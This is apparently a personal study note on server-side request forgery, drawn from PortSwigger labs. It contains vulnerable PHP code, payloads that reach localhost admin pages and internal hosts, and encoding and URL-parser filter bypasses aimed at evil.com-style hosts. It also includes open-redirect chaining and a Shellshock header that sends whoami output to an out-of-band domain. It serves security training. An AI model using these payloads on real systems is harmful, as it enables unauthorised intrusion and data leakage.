**Server-side request forgery** (also known as `SSRF`) is a web security vulnerability that *allows an attacker to induce the server-side application to make requests to an unintended location*.

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.

Types of SSRF :-
- Regular/In-Band
- Blind/Out-of-Band

```php
# Vulnerable SSRF Code, prevents LFI
<?php
    $location=$_GET['path']; 
    if( stripos( $location, 'file' ) !==false) {
    echo 'try harder'; 
    } else {
    $curl = curl_init();
    curl_setopt ($curl, CURLOPT_URL, $location); 
    curl_exec ($curl); 
    curl_close ($curl); 
}
?>
```

---
# SSRF attacks against the server itself
In an SSRF attack against the server itself, the *attacker induces the application to make an HTTP request back to the server that is hosting the application*, via its loopback network interface. This will typically involve supplying a URL with a hostname like `127.0.0.1` (a reserved IP address that points to the loopback adapter) or `localhost` (a commonly used name for the same adapter).

Example :-
```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.
In this situation, an attacker can modify the request to specify a URL local to the server itself. For example:
```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://localhost/admin
```

Here, the server will fetch the contents of the `/admin` URL and return it to the user.

Now of course, the attacker could just visit the `/admin` URL directly. But the administrative functionality is ordinarily accessible only to suitable authenticated users. So an attacker who simply visits the URL directly won't see anything of interest. However, when the request to the `/admin` URL comes from the local machine itself, the normal [access controls](https://portswigger.net/web-security/access-control) are bypassed. The application grants full access to the administrative functionality, because the request appears to originate from a trusted location.

---
# SSRF attacks against other back-end systems
There might be other internal systems not accessible to the public. We need to do a **Ping Scan** to search for the valid node.
```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118
stockApi=http://192.168.0.$X$/admin                   %% Go to Burp Intruder & do the Ping Scan %%
```

Fuzz for different ports as well! (Ex: stockApi=http://localhost:$X$)

---
# Circumventing common SSRF defenses
 - [ ] Use different `encoding` schemes
- *Decimal-encoded* version of 127.0.0.1 is 2130706433
- 127.1 resolves to 127.0.0.1
- *Octal representation* of 127.0.0.1 is 017700000001

- [ ] Obfuscating blocked strings using URL encoding or case variation
```http
http://%2f%2flocalhost%2fadmin%2fdelete?username=carlos
http://%2f%2flocalhost/login/../%2fadmin%2fdelete?username=carlos
http://%2f%2flocalhost/x/../%2fadmin%2fdelete?username=carlos
https://%2f%2flocalhost/login/../%2fadmin%2fdelete?username=carlos
http://%2f%2flocalhost/////admin%2fdelete?username=carlos
http://127.1/ADMIN/delete?username=carlos
http://localhost/AdMiN/delete?username=carlos
```
Double URL Encode characters too if these don't work!

- [ ] Change http to https or vice-versa

---
# SSRF with whitelist-based input filters
The URL specification contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:

-   You can embed credentials in a URL before the hostname, using the `@` character. For example:
    `https://expected-host:fakepassword@evil-host`
-   You can use the `#` character to indicate a URL fragment. For example:
    `https://evil-host#expected-host`
-   You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
    `https://expected-host.evil-host`
-   You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. Note that you can also try *double-encoding* characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
-   You can *use combinations* of these techniques together.
Example :-
`http://localhost#@stock.weliketoshop.net:8080/admin/delete?username=carlos`               %% Double URL Encode "#" character %%


###### Abusing URL Parsers
```http
http://google.com#@evil.com/

// If function used in backend is PHP parse_url() --> google.com will be considered as the main domain
// If function used in backend is PHP readfile()  --> evil.com will be considered as the main domain
```


Portswigger Lab Solution Explanation : [Why does Portswigger's solution to the lab "SSRF with whitelist-based input filter" work? - Information Security Stack Exchange](https://security.stackexchange.com/questions/226714/why-does-portswiggers-solution-to-the-lab-ssrf-with-whitelist-based-input-filt?newreg=1bfdb14f82764f108f469829b1a56757)

---
# Bypassing SSRF filters via open redirection
_An open redirect occurs when an application takes a parameter and redirects a user to that parameter value without any conducting any validation on the value_.

Common Parameters
dest, redirect, uri, path, continue, url, window, to, out, view, dir, show, navigation, Open, url, file, val, validate, domain, callback, return, page, feed, host, port, next, data, reference, site, html


For example, suppose the application contains an open redirection vulnerability in which the following URL:
```http
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

returns a redirection to:
```http
http://evil-user.net
```

You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:
```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

If the Vulnerable Input Field doesn't take `http://`, try only the path *without* http
```http
stockApi=/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin/delete?username=carlos
```

---
# SSRF to Responder
Send a request back to the attacker machine if target looks like an AD machine!
Send through HTTP or LDAP or any other service!

---
# Blind SSRF
The most reliable way to detect blind SSRF vulnerabilities is using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques. This involves attempting to trigger an HTTP request to an external system that you control, and monitoring for network interactions with that system.

The easiest and most effective way to use out-of-band techniques is using **Burp Collaborator**. You can use **Burp Collaborator** to generate unique domain names, send these in payloads to the application, and monitor for any interaction with those domains.

##### Note
It is common when testing for SSRF vulnerabilities to observe a DNS look-up for the supplied Collaborator domain, but *no subsequent HTTP request*. This typically happens because the application attempted to make an HTTP request to the domain, which caused the initial DNS lookup, but the *actual HTTP request was blocked by network-level filtering*. It is relatively common for infrastructure to allow outbound DNS traffic, since this is needed for so many purposes, but block HTTP connections to unexpected destinations.


## Blind SSRF with Shellshock Exploitation
#blindssrf 

- Insert the [[Shellshock]] Payload such that the request is sent to our domain.
Example :-
```http
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).urpy7yzusv8iimmebks3alqei5owct0i.oastify.com;
```

`$(whoami)`: This is a command substitution. The `whoami` command returns the username of the currently logged-in user. The output of `whoami` is then substituted into the command, resulting in the username being appended to the domain name.

---
# Automation
Automatically find SSRF Vulnerable End-Points using **Collaborator Everywhere**!
First put the domain name in the **Scope**, then check in Issue Activity whether you've found an SSRF Vulnerability!

![[Pasted image 20230705194958.png]]
